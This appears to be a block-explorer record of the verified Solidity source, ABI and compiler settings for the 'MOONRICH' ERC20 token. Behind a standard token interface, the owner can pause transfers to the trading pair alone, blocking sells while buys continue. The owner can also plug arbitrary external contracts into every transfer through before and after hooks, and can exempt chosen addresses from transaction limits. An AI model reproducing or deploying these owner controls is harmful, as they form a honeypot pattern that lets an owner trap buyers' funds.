{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\ncontract permission {\r\n    mapping(address => mapping(string => bytes32)) private permit;\r\n\r\n    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }\r\n\r\n    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(\"null\"))); }\r\n\r\n    function checkpermit(address adr,string memory str) public view returns (bool) {\r\n        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }\r\n    }\r\n}\r\n\r\ninterface IAUTOMATEMAKETMAKER {\r\n    function onTransfer(address from,address to, uint256 amount) external;\r\n}\r\n\r\ncontract ERC20CodeLess is permission {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint amount);\r\n    event Approval(address indexed from, address indexed to, uint amount);\r\n\r\n    string public name = \"MOONRICH\";\r\n    string public symbol = \"MOONRICH\";\r\n    uint256 public decimals = 18;\r\n    uint256 public totalSupply = 25_000_000 * (10**decimals);\r\n\r\n    mapping(address => uint) public balances;\r\n    mapping(address => mapping(address => uint)) public allowance;\r\n\r\n    address public pair;\r\n    IAUTOMATEMAKETMAKER public before_amm;\r\n    IAUTOMATEMAKETMAKER public after_amm;\r\n    bool public beforeTokenTransfer = false;\r\n    bool public afterTokenTransfer = false;\r\n\r\n    bool public enabletrading = true;\r\n    bool public maxtx = false;\r\n    bool public istrigger = false;\r\n    \r\n    constructor() {\r\n        balances[msg.sender] = totalSupply;\r\n        newpermit(msg.sender,\"owner\");\r\n        newpermit(msg.sender,\"exclude_maxtx\");\r\n    }\r\n    \r\n    function balanceOf(address adr) public view returns(uint) { return balances[adr]; }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender,to,amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint amount) public returns(bool) {\r\n        allowance[from][msg.sender] -= amount;\r\n        _transfer(from,to,amount);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address to, uint256 amount) public returns (bool) {\r\n        require(to != address(0));\r\n        allowance[msg.sender][to] = amount;\r\n        emit Approval(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from,address to, uint256 amount) internal {\r\n        require(to != address(0));\r\n        if(istrigger){\r\n            return _basictransfer(from,to,amount);\r\n        }else{\r\n            if(to==pair && pair!= address(0)){\r\n                require(enabletrading,\"!ERROR : TRADING WAS PAUSE\");\r\n                if(maxtx && !checkpermit(from,\"exclude_maxtx\")){\r\n                    require(amount<totalSupply/1000,\"!ERROR : MAX TAX 0.1%\");\r\n                }\r\n            }\r\n\r\n            if(beforeTokenTransfer){\r\n                istrigger = true;\r\n                before_amm.onTransfer(from,to,amount);\r\n                istrigger = false;\r\n            }\r\n\r\n            balances[from] -= amount;\r\n            balances[to] += amount;\r\n\r\n            if(afterTokenTransfer){\r\n                istrigger = true;\r\n                after_amm.onTransfer(from,to,amount);\r\n                istrigger = false;\r\n            }\r\n\r\n            emit Transfer(from, to, amount);\r\n        }\r\n    }\r\n\r\n    function _basictransfer(address from,address to, uint256 amount) internal {\r\n        balances[from] -= amount;\r\n        balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function settingpair(address adr) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        pair = adr;\r\n        return true;\r\n    }\r\n\r\n    function maxtxSwitch() public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        maxtx = !maxtx;\r\n        return true;\r\n    }\r\n\r\n    function changeTradingState() public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        enabletrading = !enabletrading;\r\n        return true;\r\n    }\r\n\r\n    function setBeforeTokenTransfer(address adr,bool flag) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        before_amm = IAUTOMATEMAKETMAKER(adr);\r\n        beforeTokenTransfer = flag;\r\n        return true;\r\n    }\r\n\r\n    function setAfterTokenTransfer(address adr,bool flag) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        after_amm = IAUTOMATEMAKETMAKER(adr);\r\n        afterTokenTransfer = flag;\r\n        return true;\r\n    }\r\n\r\n    function excludemaxtx(address adr,bool flag) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        if(flag){ newpermit(adr,\"exclude_maxtx\"); }else{ clearpermit(adr,\"exclude_maxtx\"); }\r\n        return true;\r\n    }\r\n\r\n    function transferOwnership(address adr) public returns (bool) {\r\n        require(checkpermit(msg.sender,\"owner\"));\r\n        newpermit(adr,\"owner\");\r\n        clearpermit(msg.sender,\"owner\");\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"afterTokenTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"after_amm\",\"outputs\":[{\"internalType\":\"contract IAUTOMATEMAKETMAKER\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"beforeTokenTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"before_amm\",\"outputs\":[{\"internalType\":\"contract IAUTOMATEMAKETMAKER\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"changeTradingState\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"str\",\"type\":\"string\"}],\"name\":\"checkpermit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enabletrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"excludemaxtx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"istrigger\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxtx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxtxSwitch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"setAfterTokenTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"setBeforeTokenTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"settingpair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20CodeLess", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://44aff0fc554cbe38a96ea11a4fe7e5e1043d705bfef9b1886b5e268e2e52d539"}